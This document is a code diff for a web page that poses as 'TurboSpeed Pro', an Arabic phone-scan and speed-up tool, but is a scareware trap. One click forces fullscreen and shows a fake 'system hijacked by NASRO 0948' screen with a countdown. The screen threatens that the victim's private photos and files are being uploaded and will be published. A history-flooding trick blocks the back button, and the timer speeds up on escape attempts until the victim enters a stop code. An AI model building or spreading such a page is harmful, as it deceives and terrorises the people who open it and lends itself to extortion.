@@ -4,54 +4,51 @@
     <meta charset="UTF-8">
     <title>🚀 TurboSpeed Pro | فحص وتسريع الهاتف</title>
     
-    <meta property="og:title" content="🚀 سرّع هاتفك والوايفاي الآن 300% مجاناً!" />
-    <meta property="og:image" content="image_7e9ad3.jpg" />
-
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #fff; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
         
-        /* جعل الصورة التي اخترتها هي الواجهة كاملة */
+        /* واجهة الطعم الاحترافية */
         #fake-ui {
             width: 100%; height: 100%;
-            background: url('image_7e9ad3.jpg') no-repeat center center;
+            background: #fff url('image_7e9ad3.jpg') no-repeat center center;
             background-size: contain;
+            display: flex; flex-direction: column; align-items: center; justify-content: flex-end;
             cursor: pointer;
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
         }
 
-        /* زر شفاف فوق الصورة لكي يضغط الضحية في أي مكان */
-        .overlay-trigger {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 5;
+        .btn-trigger {
+            background: linear-gradient(90deg, #00d2ff, #3a7bd5); color: white;
+            border: none; padding: 18px 50px; border-radius: 50px;
+            font-weight: bold; font-size: 1.4rem; margin-bottom: 50px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2); z-index: 10;
         }
 
-        #horror-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: black; }
+        /* واجهة الرعب - قبضة نصرو */
+        #horror-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: black; color: white; }
         canvas { position: absolute; top: 0; left: 0; z-index: 1; }
-        .box {
-            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.95);
-            border: 4px solid #f00; padding: 30px; text-align: center;
-            box-shadow: 0 0 100px #f00; width: 85%; max-width: 480px; margin: 10% auto; color: white;
+        .horror-box {
+            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
+            border: 3px solid #f00; padding: 30px; text-align: center;
+            width: 85%; max-width: 450px; margin: 15% auto; box-shadow: 0 0 50px #f00;
         }
-        .timer { font-size: 4.5rem; color: #f00; font-weight: bold; }
+        .timer { font-size: 4rem; color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="fake-ui" onclick="startTrap()">
-        <div class="overlay-trigger"></div>
+        <button class="btn-trigger">فحص هاتفك الآن</button>
     </div>
 
     <div id="horror-ui">
         <canvas id="matrix"></canvas>
-        <div class="box">
-            <h1 style="color: #f00; margin: 0;">⚠️ SYSTEM HIJACKED ⚠️</h1>
-            <h3 style="color: #fff; margin: 5px 0;">BY NASRO 0948</h3>
+        <div class="horror-box">
+            <h1 style="color: #f00;">SYSTEM CRITICAL</h1>
+            <h2>HIJACKED BY NASRO 0948</h2>
             <div class="timer" id="countdown">30:00</div>
-            <p>تحذير: جاري رفع الصور والملفات.. إغلاق الصفحة = نشر الفضائح!</p>
-            <input type="password" id="pass" placeholder="أدخل كود الإيقاف" style="padding:15px; width:80%; text-align:center;">
-            <button onclick="check()" style="margin-top:15px; padding:15px; background:#f00; color:white; border:none; width:90%; font-weight:bold; cursor:pointer;">إلغاء الرفع</button>
+            <p>⚠️ جاري سحب جميع الصور والملفات الخاصة بك..<br>أي محاولة للخروج تعني نشر البيانات فوراً!</p>
+            <input type="password" id="pass" placeholder="أدخل كود الإيقاف" style="padding:15px; width:80%; text-align:center; background:#000; border:1px solid #f00; color:#f00;">
+            <button onclick="checkPass()" style="margin-top:15px; padding:15px; background:#f00; color:#fff; width:90%; cursor:pointer; font-weight:bold; border:none;">إيقاف الرفع</button>
         </div>
     </div>
 
@@ -70,7 +67,7 @@
             if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(e=>{});
             startMatrix();
             startTimer();
-            setupSjail();
+            setupPrison();
         }
 
         function startTimer() {
@@ -84,18 +81,20 @@
             }, 1000);
         }
 
-        function setupSjail() {
+        function setupPrison() {
             for (let i = 0; i < 150; i++) history.pushState(null, null, location.href);
             window.onpopstate = function () {
                 history.pushState(null, null, location.href);
                 timeLeft -= 300;
-                alert("🚨 قبضة نصرو: الهروب مستحيل! تم خصم 5 دقائق!");
+                alert("🚨 قبضة نصرو: محاولة الهروب تسرع عملية النشر!");
             };
         }
 
-        function check() {
+        function checkPass() {
             if(document.getElementById('pass').value === "0948") {
-                active = false; alert("نجوت!"); window.location.href = "https://google.com";
+                active = false; alert("نجوت هذه المرة!"); window.location.href = "https://google.com";
+            } else {
+                timeLeft -= 60; alert("كود خاطئ! تم تسريع الرفع!");
             }
         }
 
